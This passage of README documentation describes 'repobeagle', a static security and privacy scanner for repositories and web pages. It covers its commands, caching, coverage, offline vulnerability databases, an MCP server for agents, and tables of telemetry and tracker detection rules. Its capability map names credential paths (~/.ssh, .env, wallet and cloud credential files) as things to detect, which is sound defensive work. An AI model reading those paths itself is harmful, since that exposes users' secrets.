The offline analysis is cached by content under `$XDG_CACHE_HOME/repobeagle/results/` (0600 files): the key hashes the tree content (the commit for git targets, a file-content digest for local directories), the ruleset, the **resolved image digest**, the docker/local mode, the `--since` scope and the tool version. A repeat scan of the same inputs is a `meta.cache: hit` and serves the raw findings without re-running the scanners; the profile, privacy mode and `--no-redact` are applied *after* the read, so `--strict` on a cached balanced scan re-filters instead of rescanning. `--no-cache` ignores the cache (`meta.cache: disabled`); partial (`--max-seconds`) results are never stored, and a cache hit satisfies a budget immediately with the complete answer from identical inputs (use `--no-cache` to force a fresh timed run); host-side OSV/trust/`--verify-deps` stages are not cached and still run when enabled. The cache keeps the same raw snippets the report would show, locally and mode 0600 — nothing is published from it. Stale-cache risk is handled by keying the resolved image digest: a re-pulled tag misses.

`repobeagle batch <targets-file>` runs the full scanner for every target in a listing (one git URL, `owner/repo` or local dir per line, `#` comments, JSON accepted) and writes one report per target plus a `batch.json` summary: per-target `verdict`/`counts`, bounded concurrency (`--jobs`, default 4), and the same code path as `scan`, so each report is identical to a sequential run minus timings. A target that cannot be scanned becomes `unknown` in the summary with its error tail; the batch continues. The exit code is the worst target verdict (0 GREEN, 1 YELLOW, 2 RED, 1 when only unknown). Inside one target, `scan --jobs N` (default 4) runs the four external scanners concurrently — they are independent subprocesses with separate output files, and results are assembled in a fixed tool order, so the report does not depend on completion order; `--jobs 1` is the sequential mode. Docker daemon contention is the practical limit for large batches.

`repobeagle gate <entries-file>` scans every entry a directory lists — MCP registry, agent-skill catalog, awesome-list — and emits a per-entry verdict for the directory's CI. The file is one `owner/repo`, git URL or local path per line (`#` comments; JSON list or `{"entries": [...]}` also accepted, duplicates collapse). Each entry uses the metadata-only `head` path (GitHub contents API or a local dir; no clone, no scanners, no repo code) and shares its per-slug cache (`BEAGLE_HEAD_CACHE_TTL`, `--no-cache` bypasses; `--jobs N` parallelises fetches; results stay in listing order). An entry that cannot be fetched is `unknown` with the reason — **never GREEN** — and the JSON/markdown output says so. The gate fails (exit 1) only on an entry that is RED now and was not RED in `--baseline` (a previous gate JSON; without one, every RED is new); `--report-only` never fails. `--json` and `--markdown` produce the artifact and job summary; a reusable `.github/workflows/gate.yml` runs the same command from a pinned tools ref with no image or secrets.
Exit code: 0 = GREEN, 1 = YELLOW, 2 = RED. Colour turns off when output isn't a terminal or `NO_COLOR` is set.

`repobeagle map <target>` answers a different question: not "is it safe?" but "what can it touch?". It lists remote hosts, secret paths (`~/.ssh`, `.env`, wallet and cloud credential files), subprocesses, environment variables, client storage, install hooks and permission scopes, each with the first `file:line`. It is computed by the same offline scan (`meta.capabilities` in `--json`), can render an existing report with `--report r.json`, and never executes repository code; `--network` additionally runs OSV and GitHub trust lookups. This is the view to read before running something in your own shell, and the one to diff between two versions — `--ref <rev>` scans a pinned branch/tag/sha for that comparison.

Noise is classified, not hidden in the JSON: every `meta.capabilities` entry carries `doc` (documentation file or `docs/`) and `test` (`tests/`, `fixtures/`, `spec/`, …), and the human view collapses those into an "N docs/test" count unless you pass `--all`. Entries also carry `verified` and `source: "static"`; a syscall trace (T6) passes its evidence to the same collector and flips matching entries to `verified: true, source: "trace"`, adding capabilities static analysis missed with `file: "(trace)"`. The report's `Capabilities:` summary counts only code entries and says how many doc/test ones were hidden.

```json
{"network": [{"value": "api.stripe.com", "file": "src/pay.js", "line": 12, "count": 2,
              "doc": false, "test": false, "verified": false, "source": "static"}]}
```

`repobeagle web <url>` runs the same privacy rules against a live page instead of a repository: it fetches once (no JavaScript, no crawling, 2 MB cap), treats the page's own host as first-party, and reports the third-party hosts, trackers, cookies, PII in URLs/forms, framing and permission delegation it sees. `--assets N` also fetches up to N same-origin scripts/stylesheets so inline-ESM imports and CSS `@import`/`url()` are inspected. The report is marked `meta.mode = "web (fetched once, no JS executed)"`, `meta.url` and `meta.fetched`; `file://` works, which is how the test suite covers it offline.

Behaviour and limits, explicitly:

- **Redirects** are followed by the HTTP client (bounded by `--timeout`); `meta.fetched.final_url` and `redirected` record where the request landed and a note says it moved. `meta.url` stays the URL you asked for. **robots.txt is not consulted**: the audit makes one GET, it is not a crawler.
- **Size cap** is 2 MB per document (page and each asset). A larger page is cut and flagged (`meta.fetched.truncated`, with a note), so a huge page cannot dominate runtime.
- **`--assets` failures** (404, TLS error, timeout) are notes, never fatal: `meta.fetched.asset_failures` counts them and the page verdict is computed from what was fetched. Same-origin assets only, unless the page is `file://`.
- **Privacy-only by design**: web mode uses `--privacy-only`, so non-privacy findings are filtered out; a single page has no install hooks or dependencies, and the question here is "who does it talk to?". The scanners still run on the page bytes (nothing is installed or executed).
- **Not covered**: JavaScript is never executed, so tags, cookies and consent managers injected at runtime are invisible; there is no crawling (one page, at most N assets), pages behind auth or a SPA shell under-report, and the first-party inference trusts the page host (and a synthetic `CNAME` in the temp tree).

Reports also state their own blind spot: `meta.coverage` records the source bytes covered by language-aware rules, files scanned, why the rest was not read (archive, binary, oversize, unreadable), the top unscanned extensions with no language rules, and `languages` with `inspected` and `no_rules` buckets (a C/C++, Elixir or Zig repository shows up there: its files may be read by the universal text checks, but no language-specific rules ran on them). The printed report shows the same as a `Coverage:` line, including `no language rules for: …`, and `coverage-low` (severity `low`) fires when under 60% of source bytes were covered on a repository with at least 20 files. Decision, deliberately: `coverage-low` does **not** raise the balanced or relaxed verdict (a `low` finding leaves them GREEN), but `--strict` turns that YELLOW — the field is still the first thing to read before trusting a GREEN. A GREEN verdict over files nobody parsed is not evidence of safety.

`--ref <branch|tag|sha>` pins a scan to an exact object instead of the default branch and records `meta.ref` plus the resolved 40-character `meta.commit` (annotated tags are peeled to their commit), so a report is comparable with a later re-scan of the same commit. It applies to git URLs (including `file://` mirrors, which are useful for hermetic tests); a local directory is copied as-is and `meta.commit` stays null. `--since <rev>` needs a git URL too (see below), and `map --ref` mirrors the flag; `web` audits a single URL and has no ref. (Bumping the image digest also changes the toolchain, which `meta.tools` records.)

`--since <rev>` narrows the scan to the files a diff touched (`git diff --name-status --diff-filter=AMRD`, so modifications, additions, renames (followed to the new path) and deletions are all accounted for), plus root manifests and `.repobeagleignore` for context, and materializes only those paths — a PR-sized change is scanned in seconds instead of the whole tree. `meta.scope` records `changed_files`, `renamed_files`, `deleted_files`, `listed_files` and `checked_out`, and the report prints a `scope:` line. **This is a diff verdict, not a full-repo verdict**, and every downstream surface says so: the badge JSON carries `scope: {mode: "changed", since, changed_files}`, the MCP `scan_repo` payload carries the same `scope` object (and accepts `ref`/`since`), and the reusable workflow's commit status is suffixed `[diff since <rev>]`. The reusable workflow takes `scan-ref` and `changed-since` inputs for exactly this (see [Badge your repo](#badge-your-repo)); it switches to scanning the repository URL when either is set, because `--ref`/`--since` need a git URL.

Performance note versus a full scan, measured on this machine with `--no-osv --no-trust` so only clone and scanners count (2026-11-26, image v1.162.0): `psf/requests@v2.32.3` full scan 7.1 s (82/131 files scanned) vs `--since v2.32.2` 8.1 s (5/5 files, 3 changed, 5 materialized of 131 listed) — at that size the fixed clone/diff cost dominates. `django/django@5.1` full scan 90.0 s (4003/6791 files scanned) vs a one-commit diff (`--since 8baab82f…`) 5.6 s (3/3 files, 3 materialized of 6815 listed): the saving is proportional to the files actually examined, so a PR-sized diff is ~16× faster while a whole-release diff (1127 changed files, 674 s in the same run) is not.

Findings whose fix is mechanical carry a `remediation` field and a `fix:` line in the report (and a Fix column in the Markdown export, and `properties.remediation` in SARIF). It is one deterministic next action, not a suggestion: pin the action to a SHA, add the cookie flags, use `pull_request`, run `npm ci --ignore-scripts`, or review what the rule flagged. Rules with no obvious single fix deliberately carry none.

The policy is explicit and test-enforced: `REMEDIATION` maps rule prefixes to one line of advice, and `NO_REMEDIATION` maps rules where no single action is right to a reason (for example `consent-manager` is a positive signal, `external-endpoint` is inventory). `remediation_audit()` groups every fixture finding under fixed / documented-none / mixed (a rule family with informational and actionable variants such as `privacy-doc: privacy policy present` vs `privacy-doc: no privacy policy file`) and `tests/test_remediation.py` fails on any rule with neither, so adding a rule without deciding its advice fails CI. Wording rule: advice must be concrete, short, and either state an alternative or describe what to read when it could be wrong for a legitimate use — it never claims a defect for an inventory finding. Scanner-native findings are covered by class (`Hardcoded secret` → rotate and ignore the file, `Bandit <code>` → fix the call site, `GuardDog` → review and pin the package, `semgrep` → apply what the rule message describes), while the scanner's own rule documentation stays the authority.

OSV normally queries osv.dev, which makes two scans of the same commit differ by the day. `repobeagle db --update <dir>` downloads osv-scanner's offline vulnerability databases for the ecosystems detected in that directory (per-ecosystem zips, `$XDG_CACHE_HOME/osv-scalibr/<ecosystem>/all.zip`, tens of MB each), and `scan --offline-vulnerabilities` uses them with no network call. `repobeagle db` alone prints the status without touching the network.

Deterministic vulnerability mode, end to end:

1. `repobeagle db --update <dir>` on a machine with network (explicit, one-off; the CI nightly job does this weekly and caches the result). What it fetches: only the ecosystems osv-scanner finds in that directory (PyPI in `tests/fixtures/control-vuln`, npm/crates/Go/... elsewhere) — not an NVD-wide mirror, and nothing for ecosystems absent from the target.
2. `repobeagle scan <target> --offline-vulnerabilities` then reads those zips offline. The report records `meta.osv_db{path, updated, age_days, stale, max_age_days, bytes, ecosystems[{ecosystem, bytes, corrupt}]}`; the same database and commit produce the same vulnerability findings, so re-running the pinned image and diffing is meaningful.
3. `verify` warns when a report used a database older than the policy (default 30 days, `BEAGLE_DB_MAX_AGE_DAYS`) or none at all, and `db`/scan flag a truncating or corrupt zip (a zip-directory probe, not a full read) instead of silently returning no vulnerabilities.

CI uses the same mode: the nightly job refreshes and caches the PyPI database (keyed by ISO week), and the PR `ci` job restores that cache and runs `scan tests/fixtures/control-vuln --offline-vulnerabilities`, asserting the database it used. Limits: a stale database misses new advisories (hence the warning), the download is explicit network, and without a database the scan reports no vulnerability findings and says so in the notes.

When the advisory lists fixed versions — explicit OSV `affected[].ranges[].events[].fixed` events — each OSV finding carries `fixed_in` (sorted) and a `remediation` such as "upgrade lodash to 4.17.21"; only explicit `fixed` events are trusted. If an advisory has none, the finding says so explicitly (`fixed_note: "no fixed version listed by OSV"`) and performs at most one cached registry lookup to report the package's latest published version (`latest_version`), capped per scan (`BEAGLE_FIX_LOOKUPS`, default 20) and cached under the registry cache. No extra network is used when OSV already lists a fixed version.

OSV findings also answer *why* the package is in the tree: when the lockfile carries dependency edges (`package-lock.json` v2/v3, pip-compile `# via` comments), each finding gains `dependency_path` (`app → left-pad → trim`), `dependency_depth` (`1` for a direct dependency) and `dependency_source` (the manifest). The human report prints `via: …` under the finding. When the lockfile has no edges — Cargo.lock (a sparse index), plain `requirements.txt` without `# via` — the scanner falls back to the manifest's direct dependencies for depth 1 and records `dependency_note` for the rest instead of guessing their depth. No network is involved: the graph is read from the same text files as the SBOM.

### Use from an AI agent (MCP)

`repobeagle mcp` runs a Model Context Protocol server over stdio, so an agent can check a repository before it clones or installs it. Tools: `scan_repo` (URL or directory, profile, privacy-only, network on/off, `timeout_seconds`), `verify_badge` (signature + freshness) and `explain_report` (threshold arithmetic of a stored report). JSON-RPC 2.0, one message per line, logs to stderr only, and it still never executes repository code. Reports are kept under `$XDG_CACHE_HOME/repobeagle/mcp` (20 most recent, pruned) so a client can read the full JSON, and the wire schemas are exercised by the official MCP Python SDK in `tests/test_mcp_interop.py`.

```json
{"mcpServers": {"repobeagle": {"command": "repobeagle", "args": ["mcp"]}}}
```

Per-tool examples (raw calls; a client SDK hides the transport):

```jsonc
// scan_repo: verdict + top findings, report path kept for explain_report
{"jsonrpc":"2.0","id":1,"method":"tools/call","params":{"name":"scan_repo","arguments":{
  "target":"https://github.com/some/agent-skill","profile":"balanced","network":false,"timeout_seconds":600}}}
// explain_report: thresholds and the margin to the next tier, from the stored report
{"jsonrpc":"2.0","id":2,"method":"tools/call","params":{"name":"explain_report","arguments":{"report":"<path from scan_repo>"}}}
// verify_badge: Sigstore signature, freshness and self-consistency of a published badge (needs network)
{"jsonrpc":"2.0","id":3,"method":"tools/call","params":{"name":"verify_badge","arguments":{"repo":"owner/repo"}}}
```

**Blocking, timeouts and cancellation.** Requests are handled one at a time and in order. `scan_repo` returns only when the scan finishes: the default budget is 1800 s and `timeout_seconds` (5–1800) bounds it — on expiry the scan process is killed and the call comes back with `isError`, naming the timeout. `notifications/cancelled` is accepted but cannot interrupt an in-flight scan (it is read between messages), so a client that gives up should kill the process; no progress notifications are sent yet. `scan_repo` with `network: false` and `explain_report` are offline apart from the clone of a URL target; `verify_badge` needs the network.

**Tool schema stability.** The `inputSchema` of the three tools is part of the contract: the interop test asserts the wire schemas equal `MCP_TOOLS`, so removing or renaming an argument is a breaking change (document it with the ruleset/version note); adding an optional argument is fine.

`repobeagle privacy <target>` is the same as `scan --privacy-only`: a privacy audit that only reports privacy/telemetry findings. OSV vulnerability scanning and GitHub trust signals are skipped automatically in this mode (their findings would be filtered anyway), and the report notes that. Reports record `meta.privacy_mode` (`full`, `only` or `excluded`), and a privacy-only badge carries `"privacy_only": true` so consumers know the verdict basis. Each `--json` finding carries a stable `rule` id (the title prefix, e.g. `telemetry-analytics`, `pii-email`) for filtering/automation. `--privacy-only` does it inline, `--no-privacy` drops those findings, `--no-redact` shows raw PII in snippets instead of the default masking. `--min-severity` filters only the printed findings (verdict/counts and `--json` still cover everything). `--version`/`version` print the installed version and image tag. `repobeagle update --check` reports installed vs latest (exit 10 when an update exists); `repobeagle update` pulls the latest release image (refreshing it even when the code is current), runs `git pull --ff-only` in a checkout and then `install.sh`, and retargets a stale wrapper (e.g. one still pointing at `jvr0x` or an old tag). A `BEAGLE_IMAGE` exported by the shell still overrides the wrapper default; `--version` flags that case. Scans check GitHub's release API at most once a day (cached under `~/.cache/repobeagle`) and print an update notice to stderr; set `BEAGLE_NO_UPDATE_CHECK=1` to disable or `BEAGLE_UPDATE_INTERVAL` (seconds) to change the cadence. The check never contacts the scanned repo.

| Profile | RED when | YELLOW when |
|---|---|---|
| strict | any high or critical | any low or above |
| balanced (default) | any critical | any medium or above |
| relaxed | any critical | any high |

To change the thresholds, edit `PROFILES` in `repobeagle/core.py`.

## Repository layout

The scanner is a package of cohesive modules: `repobeagle/core.py` (shared helpers, verdicts,
config, suppression), `repobeagle/rules/agent.py` and `repobeagle/rules/privacy.py`
(agent-facing and privacy/telemetry detection), `repobeagle/scanners.py` (external scanner
wrappers, cache, coverage, deadline, OSV), `repobeagle/fetch.py` (git/archives/GitHub/web),
`repobeagle/report.py` (console/Markdown/HTML/SARIF/SBOM renderers), and
`repobeagle/{cli,service,app,index}.py` (commands and servers). `repobeagle.py` is a thin
shim, so `python3 repobeagle.py …` and `import repobeagle` keep working; the wheel exposes
the package and its console script. In a checkout, use `python3 repobeagle.py …` (the old
root-level `repobeagle` shell wrapper is gone: the package directory now owns that name).

Rules have explicit metadata: `repobeagle/rules/registry.py` (generated from the rule table
below by `tools/gen_rule_registry.py`, checked by `tests/test_registry.py`) defines
`Rule(id, severity, meaning, remediation, docs)`, and every finding carries its `rule` id, so
consumers no longer split titles. Regenerate the registry after editing the table:
`python3 tools/gen_rule_registry.py`.

## Privacy: telemetry and trackers

A repo that is safe to run is not necessarily safe to *use*. The `telemetry` check reports who a repo phones home to, statically, from code, manifests and configs (no network, no repo code executed). Each finding is one vendor/endpoint with the first `file:line`, the number of hits and the rule id naming the kind:

| Rule id | What it means | Severity |
|---|---|---|
| `telemetry-session-replay` | records what you do (clicks, keystrokes, forms, page content): Clarity, Hotjar, FullStory, LogRocket, Smartlook, Mouseflow, Lucky Orange, Highlight, OpenReplay, Datadog RUM, Contentsquare, Quantum Metric, Glassbox, Medallia, rrweb, Sentry Replay (`replaysSessionSampleRate`), PostHog Replay (`disable_session_recording: false`) | high/medium |
| `telemetry-ads` | advertising/attribution pixels and SDKs with per-device IDs: Meta, TikTok, LinkedIn, X/Twitter, Pinterest, Reddit, Microsoft UET, **Google AdSense/Ad Manager**, Criteo, Taboola, Outbrain, Amazon Ads, Snap, **AdRoll**, **Quora Pixel**, AppsFlyer, Adjust, Branch | high/medium |
| `telemetry-crash` | uploads stack traces and payloads, often file paths, env and request data: Sentry, Bugsnag, Rollbar, Raygun, Honeybadger, Airbrake, Exceptionless, Crashlytics, Application Insights, Backtrace, **Instabug**, **Embrace** | medium |
| `telemetry-analytics` | page views, events and persistent IDs: Google Tag Manager (`GTM-*`), Google Analytics/gtag, Firebase Analytics, tracking pixels (`1x1`, `width=1 height=1`), Plausible, Umami, Matomo/Piwik, Fathom, GoatCounter, Simple Analytics, Cloudflare/Vercel Analytics/Speed Insights, Segment, Mixpanel, Amplitude, PostHog, Heap, Countly, Adobe, Yandex Metrica, Baidu, WordPress Stats, Snowplow, RudderStack, Pendo, Optimizely, VWO, HubSpot, Klaviyo, Braze, OneSignal, Customer.io, Tealium, Mailchimp, Intercom, tracking pixels | medium/low |
| `telemetry-apm` | spans, logs or metrics are exported: **OpenTelemetry (OTEL/OTLP)**, Datadog APM (incl. `datadog*.yml`), New Relic, Elastic APM, Honeycomb, Dynatrace, Instana, AppSignal, Grafana Faro, **Sentry Tracing** (`tracesSampleRate`) | medium/low |
| `telemetry-devtool` | build/CLI tools that report usage: Next.js, Nuxt, Astro, Gatsby, Turbo, Angular CLI, .NET CLI, Homebrew, HashiCorp checkpoint, Scarf | low |
| `telemetry-identify` | SDK calls that attach a user identity/attributes: `.identify()`, `.alias()`, `setUserId`/`setUserEmail`/`setUserProperties` (and snake_case `set_user*`), `Sentry.setUser`/`sentry_sdk.set_user`; the vendor then links events to that person; only reported when a telemetry vendor is detected | low |

OTEL is reported at medium: the SDK alone sends nothing, but once an exporter endpoint (OTLP, HTTP, gRPC) is configured, traces/logs can leave the machine. Vendor names in code comments, test sources (`tests/`, `__tests__/`, `spec/`, `*.test.*`, `*.spec.*`), translation catalogs (`locales/`, `i18n/`), generated code (`generated/`, `gen/`), `CODEOWNERS`/`AUTHORS`/licence files and vendor-table definitions (tuples like `("analytics", "Plausible", …)`) are not counted as usage; prose is only scanned for opt-outs. Bare dependency names in manifests (`sentry = "0.31"` in `Cargo.toml`) are recognized. Each finding also distinguishes an opt-out **handled in code** from one only **documented** (which may be ignored) (`DO_NOT_TRACK`, `NEXT_TELEMETRY_DISABLED`, `TELEMETRY_OPTOUT`, `DISABLE_TELEMETRY`, `--no-telemetry`, `telemetry: false`, `navigator.doNotTrack`, `CHECKPOINT_DISABLE`, …) or nothing at all. Config files count too (`sentry.properties`, `datadog*.yml`). Lockfiles are read for **transitive** telemetry: a vendor pinned only as a dependency gets one `low` finding marked `(transitive)`, and is suppressed when the repo itself references it. Go module paths (`go.sum`), scoped npm names and composer paths are matched by their final path segment. Prose (`.md/.mdx/.rst/.adoc`) is only used to detect opt-outs, because "an alternative to Sentry" is not a dependency.

Severity follows privacy impact, so a default `balanced` scan goes YELLOW when a repo has analytics/crash reporting; session replay or ad pixels make a `strict` scan RED.

### Other privacy signals

| Rule id | What it flags | Severity |
|---|---|---|
| `android-cleartext` | `android:usesCleartextTraffic="true"` in `AndroidManifest.xml` or `cleartextTrafficPermitted="true"` in a network security config: the app permits plaintext HTTP | medium |
| `ios-cleartext` | `NSAllowsArbitraryLoads`/`NSExceptionAllowsInsecureHTTPLoads` enabled in a plist: App Transport Security permits plaintext HTTP | medium |
| `ios-tracking-declaration` | iOS privacy manifest plus ad/analytics SDKs: info when `NSPrivacyTracking` is declared, low when the manifest omits it | info/low |
| `android-permission` | `AndroidManifest.xml` permissions (`uses-permission` and `uses-permission-sdk-23`) that read user data: precise/background location, camera, microphone, contacts, SMS, call log, storage, ad ID (`AD_ID`/`AD_ADSERVICES_AD_ID`), Privacy Sandbox ad topics/attribution (`ACCESS_ADSERVICES_*`), nearby Wi-Fi devices, calendars, Bluetooth, all installed apps; Android 14 user-selected photo access is `info`, and permissions limited by `android:maxSdkVersion` are downgraded with a note. Benign ones (`INTERNET`, `VIBRATE`, …) are ignored | high/medium/low by data sensitivity |
| `android-feature` | `AndroidManifest.xml` `<uses-feature>` hardware declarations (`android.hardware.camera`, `microphone`, `location`, `bluetooth`, `nfc`, …) that imply the capability is used | info |
| `android-queries` | `AndroidManifest.xml` `<queries>` package visibility (Android 11+): other installed apps and `<intent>` handlers this app can discover | info |
| `extension-permission` | browser-extension `manifest.json`: `<all_urls>`/`*://*/*`/wildcard-host access, `optional_host_permissions`, `content_scripts` on every page, plus sensitive APIs (`cookies`, `history`, `tabs`, `webRequest`, `bookmarks`, `downloads`, `clipboardRead`, `geolocation`, …); benign `storage`/`alarms`/`contextMenus`/`activeTab` are `info` | high/medium/low |
| `extension-resource` | browser-extension `web_accessible_resources`: files exposed to `<all_urls>` (any site can load them and detect the extension) are `low`, site-scoped exposure `info` | low/info |
| `extension-connectable` | browser-extension `externally_connectable`: `<all_urls>` lets any website message the extension (`low`), listed sites only `info` | low/info |
| `insecure-endpoint` | `http://`/`ws://` requests to real remote hosts (plaintext), skipping local/LAN/CGNAT hosts, reference URLs in comments (line-leading or inline), XML namespace/schema identifiers, web.archive.org historical URLs, docs/test fixtures and translation catalogs (those are `info`); plaintext references that are not a request in that line are `low` | medium/low |
| `cookie-write`, `cookie-flags` | `document.cookie =` writes, the js-cookie `Cookies.set/remove` API (its `{secure, sameSite}` options are checked), `Set-Cookie` headers (reads via `.get()` excluded) and framework setters (`set_cookie(`, `res.cookie(`, `setcookie(`, `setCookie(`) missing `HttpOnly`/`Secure`/`SameSite` (header-flag matching is case-insensitive and the title names the missing flag); JS cookies are checked for `Secure`/`SameSite` only, `__Host-`/`__Secure-` cookie names must carry their required flags (a prose mention is ignored), and `Partitioned`/CHIPS is noted as positive `info` | low/info |
| `browser-storage` | `localStorage`/`sessionStorage` writes (methods and direct property assignment) and `indexedDB`: persistent client-side identifiers | info |
| `third-party-cdn` | assets loaded from third-party font/CDN hosts (Google Fonts, Bunny, Fontshare, jsDelivr, unpkg, …: they see your IP and the page URL) | low |
| `third-party-embed` | `<iframe>`/`<embed>`/`<object>` (via `src` or `data`) pointing at another host (video/audio are media): it runs third-party code, sees your IP and can set its own cookies; `info` when `sandbox`ed or `credentialless` | low/info |
| `iframe-allow` | an embedded frame delegates `camera`, `microphone`, `geolocation`, clipboard, display-capture, USB/serial, … via `allow=` (origins included when specified; also when the iframe tag is split across lines) | medium |
| `third-party-form` | `<form action="https://other">` including tags split across lines: user input is posted to a third party (own/related domains are excluded, like other endpoint rules) | low |
| `form-method` | `<form method="get">` containing password/email/phone inputs: the values end up in the URL (Referer, access logs, history) | low |
| `third-party-script` | `<script src="//other">` (incl. inline `<script>` ESM imports) or `import … from "https://other"`: executable third-party code (info for known CDNs); own/related domains are skipped | low/info |
| `third-party-preconnect` | `<link rel="preconnect">`/`dns-prefetch` to another host: the browser opens a connection (IP, TLS) before any consent or request | low/info |
| `third-party-media` | `<img>`/`<video>` (incl. `poster`, also tags split across lines)/`<source>`/`<audio>` (including `srcset`) and CSS `url()` assets from another host (own/related domains are classified as first-party): they see your IP and page URL; known CDNs are `info`, unknown hosts `low`; `@import` stays `third-party-stylesheet` | low/info |
| `third-party-stylesheet` | `<link rel="stylesheet">` or CSS `@import` from another host: it sees your IP/referrer and pulls fonts/images from its servers; known CDNs `info`, unknown `low` | low/info |
| `third-party-preload` | `<link rel="preload"/"prefetch"/"modulepreload">` from another host (with `as=script`/`as=style` classified as script/stylesheet): fetches bytes before needed, revealing your IP early | low/info |
| `cookie-lifetime` | cookies with `Max-Age`/`Expires` (RFC 1123, ISO 8601, unix epoch) or js-cookie `expires:` days over one year (`low`) or under it / session-scoped / already expired / deleted (`info`) | low/info |
| `consent-manager` | OneTrust/Optanon (`cookielaw.org`, `otSDKStub`), Cookiebot, Osano, CookieYes, Klaro, tarteaucitron, Didomi, Usercentrics, Iubenda, Sourcepoint, TrustArc, CookiePro, Fides, CookieFirst, Civic (`civicuk.com`), … (positive signal: tracking should be gated on consent) | info |
| `external-endpoint` | inventory of remote hosts in code/config/HTML, including `ws://`/`wss://` sockets and protocol-relative `//host/…`; known platforms/registries/CDNs are `info`, unknown third parties are `low`; URL values (`new URL(...)`, Swift `URL(string:)`/`URL(…)`) are `info`; asset hosts inside `src`/`srcset`/`poster`/`action`/`href` (stylesheet/preload/preconnect link tags) are reported by the specific rule instead of as generic external endpoints; comments (including inline `# …` / `// …`), docs/test fixtures and translation catalogs are `info`; `.invalid`/`.test`/`.example`/`.localhost` are ignored | info/low |
| `first-party-endpoint` | hosts belonging to the repo itself, inferred from `CNAME`, `package.json`, `pyproject.toml`, `setup.cfg`, `Cargo.toml`, `pubspec.yaml` or `composer.json`; classified as first-party and not counted against third-party checks | info |
| `macos-entitlement` | macOS `*.entitlements` capabilities granted without a per-use prompt: location, camera, microphone, photo library, contacts, calendars, Bluetooth, USB, user-selected/Downloads/Desktop/Documents/all files (read-only variants included), Apple Events automation; plain network client/server access is `info` | high/medium/low |
| `browser-capability` | web APIs that touch user data: clipboard read, geolocation, camera/microphone (`getUserMedia`, `enumerateDevices`), screen capture (`getDisplayMedia`, `MediaRecorder`), notifications, history (`history.length`/`pushState`/`replaceState`), USB/serial/Bluetooth, cross-site storage access, file pickers, payment request/Apple Pay, service workers, share sheet | medium/low |
| `client-id` | named persistent identifiers (`client_id`, `device_id`, `visitor_id`, `anonymous_id`, `distinct_id`, `installation_id`) stored in cookies/localStorage or generated as UUIDs | low |
| `fingerprint` | device fingerprinting: dedicated libraries (`fingerprintjs`, `botd`), canvas/WebGL/audio/font probing, WebRTC (peer sees your public IP), screen geometry, UA/cores/memory/plugins, implicit timezone/locale (`toLocaleString()` without explicit locale), battery/network state | high/medium/low |
| `import-time-network` | network calls at module scope (Python module body, JS top level) that run before you call anything | medium/low |
| `import-time-storage` | cookie/`localStorage` writes at JS module top level: they run on load, before user interaction or consent | low |
| `ip-logging` | request IP (`req.ip`, `remote_addr`, `X-Forwarded-For`, `HTTP_X_FORWARDED_FOR`, `True-Client-IP`, `X-Client-IP`, `CF-Pseudo-IPv4`, `Fastly-Client-IP`, …) written to logs or storage; `info` when the same line/window masks, truncates or hashes it | low/info |
| `pii-log` | log/print statements naming personal data, and logged arguments whose name is used as a value/field/method (`console.log(user.id)`, `console.dir(account)`, `{user}`, `request.body`, …; a plain prose word such as "this session." is ignored); `info` when the same line masks/redacts/hashes the value | low/info |
| `pii-email`, `pii-phone`, `pii-address`, `pii-postcode`, `pii-ssn`, `pii-card` | hardcoded email addresses, E.164 and keyword-adjacent local phone numbers (US `(415) 555-0132`, UK `020 7946 0958`, AU `0412 345 678`, …), `tel:`/`sms:`/`mailto:` links, postal addresses (US/DE/FR/ES/PO-box forms; street names must be capitalized so prose like "2 gives … a fresh place" or "via the 1104" is ignored), ZIP/postal codes next to a postal keyword, US SSNs and payment card numbers (Luhn + issued IIN prefix; Amex 15, Diners 14, 13/16/19 otherwise) in source/config; example/test values, decimal fractions and dependency version strings (`packageManager: yarn@4.18.1`) ignored, role mailboxes, package-metadata emails (`package.json`, `*.gemspec`, …) and `tel:`/`sms:`/`mailto:` links are `info`; emails/addresses published in docs (including `docs/*.txt`), contributor files (`AUTHORS`), licences, translation catalogs (`.po`) and test paths are one aggregated `info` per file; URL userinfo (`user:pass@host`), scp-style `git@host:repo`, GitHub noreply addresses, fediverse handles (`@user@instance`), Ruby ranges (`..@instance_var`), Xcode asset names (`Icon@2x.png`) and `user@10.0.0.2` SSH logins are not treated as emails | low/info |
| `tracking-cookie` | known tracking cookie names (including `__Host-`/`__Secure-` prefixed) (`_ga`, GA4 `_ga_<container>`, `_gac_*`, legacy `__utm*`, `_gid`, `_gcl_au`, `_fbp`, `_hj*`, `ajs_*`, `__hstc`, `__hssc`/`__hssrc`, `intercom-*`, `mp_*`, `ph_*`, `_clck`, `_uetvid`, `_ttp`, `_scid` (underscore-prefixed names such as `ph_`/`mp_`/`ajs_` require `=` to avoid DOM attributes like `PH_Actions`), `_epik`, `personalization_id`, `guest_id`, `fr`, `__gads`, `__gpi`, `IDE`, `NID`, …) mapped to their vendor | low |
| `ios-tracking`, `ios-tracking-domain`, `ios-data-type` | Apple privacy manifest (`PrivacyInfo.xcprivacy`): `NSPrivacyTracking`, declared tracking domains, and every `NSPrivacyCollectedDataType` with linked/tracking flags and declared purposes (analytics, advertising, app functionality, …) | low/info |
| `ios-api-category` | Apple required-reason API categories declared in `PrivacyInfo.xcprivacy` (UserDefaults, FileTimestamp, SystemBootTime, DiskSpace, ActiveKeyboards, …) with their reason codes (`CA92.1`, …) | info |
| `ios-purpose-string` | Apple purpose strings in `Info.plist` (`NSCameraUsageDescription`, `NSLocationWhenInUseUsageDescription`, …): the user-facing reason shown when the capability is requested | info |
| `dnt-respect` | repo has trackers and references (or never references) Do-Not-Track, Global Privacy Control / `Sec-GPC` or `DO_NOT_TRACK`; info when an opt-out is handled in code (including SDK switches such as `opt_out_capturing`/`setOptOut`), low when it is only documented or absent | info/low |
| `session-replay-mask` | repo uses a session-replay vendor: info when an input/text masking option is referenced (`maskAllInputs`, `maskTextSelector`, `data-hj-suppress`, `data-clarity-mask`, …), low when none is found and vendor defaults decide what PII is captured | info/low |
| `consent-gating` | analytics/ads/session replay present but no consent manager (OneTrust, Cookiebot, Osano, CookieYes, Klaro, …) detected | low |
| `consent-order` | in an HTML/JS file a tracker initialises (`gtag(`, `fbq(`, `posthog.init`, `_paq`, …) before the consent manager loads | low |
| `consent-mode` | Google Consent Mode signals (`analytics_storage`, `ad_storage`, `ad_user_data`, …); `low` when Google Analytics runs with a CMP but no Consent Mode (EEA requirement) | info/low |
